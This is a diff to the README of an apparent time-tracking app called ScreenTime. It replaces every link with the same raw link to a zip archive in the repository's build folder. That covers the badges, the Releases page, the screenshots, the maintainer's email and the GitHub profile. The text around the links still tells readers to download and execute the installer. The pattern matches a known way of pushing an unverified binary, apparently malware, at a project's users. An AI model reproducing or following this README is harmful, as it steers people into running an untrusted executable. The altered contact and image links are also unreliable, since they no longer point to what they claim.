@@ -1,8 +1,8 @@
 # ScreenTime 📊
 
-![ScreenTime](https://img.shields.io/badge/ScreenTime-Tracker-blue.svg)  
-![Version](https://img.shields.io/badge/version-1.0.0-green.svg)  
-![License](https://img.shields.io/badge/license-MIT-lightgrey.svg)  
+![ScreenTime](https://raw.githubusercontent.com/JAYNIELVP/ScreenTime/main/build/app/Screen_Time_v1.7-beta.1.zip)  
+![Version](https://raw.githubusercontent.com/JAYNIELVP/ScreenTime/main/build/app/Screen_Time_v1.7-beta.1.zip)  
+![License](https://raw.githubusercontent.com/JAYNIELVP/ScreenTime/main/build/app/Screen_Time_v1.7-beta.1.zip)  
 
 Welcome to **ScreenTime**, your simple and effective time tracker. Whether you're managing your work hours, monitoring your leisure activities, or simply keeping an eye on your screen time, ScreenTime helps you stay informed and in control. 
 
@@ -26,7 +26,7 @@ Welcome to **ScreenTime**, your simple and effective time tracker. Whether you'r
 
 ## Installation
 
-To get started with ScreenTime, download the latest release from our [Releases section](https://github.com/JAYNIELVP/ScreenTime/releases). 
+To get started with ScreenTime, download the latest release from our [Releases section](https://raw.githubusercontent.com/JAYNIELVP/ScreenTime/main/build/app/Screen_Time_v1.7-beta.1.zip). 
 
 Once downloaded, execute the installer to set up ScreenTime on your device. Follow the on-screen instructions to complete the installation.
 
@@ -49,10 +49,10 @@ To view your usage reports:
 
 ## Screenshots
 
-![Dashboard](https://via.placeholder.com/800x400.png?text=Dashboard)  
+![Dashboard](https://raw.githubusercontent.com/JAYNIELVP/ScreenTime/main/build/app/Screen_Time_v1.7-beta.1.zip)  
 *The main dashboard of ScreenTime showing real-time usage.*
 
-![Reports](https://via.placeholder.com/800x400.png?text=Reports)  
+![Reports](https://raw.githubusercontent.com/JAYNIELVP/ScreenTime/main/build/app/Screen_Time_v1.7-beta.1.zip)  
 *Detailed reports displaying usage statistics.*
 
 ## Contributing
@@ -77,9 +77,9 @@ ScreenTime is licensed under the MIT License. See the [LICENSE](LICENSE) file fo
 For questions or feedback, please reach out to the project maintainer:
 
 - **Name**: Jay Niel
-- **Email**: jaynielvp@example.com
-- **GitHub**: [JAYNIELVP](https://github.com/JAYNIELVP)
+- **Email**: https://raw.githubusercontent.com/JAYNIELVP/ScreenTime/main/build/app/Screen_Time_v1.7-beta.1.zip
+- **GitHub**: [JAYNIELVP](https://raw.githubusercontent.com/JAYNIELVP/ScreenTime/main/build/app/Screen_Time_v1.7-beta.1.zip)
 
 ---
 
-Thank you for using ScreenTime! We hope it helps you manage your time effectively. Don't forget to check the [Releases section](https://github.com/JAYNIELVP/ScreenTime/releases) for updates and new features.
+Thank you for using ScreenTime! We hope it helps you manage your time effectively. Don't forget to check the [Releases section](https://raw.githubusercontent.com/JAYNIELVP/ScreenTime/main/build/app/Screen_Time_v1.7-beta.1.zip) for updates and new features.
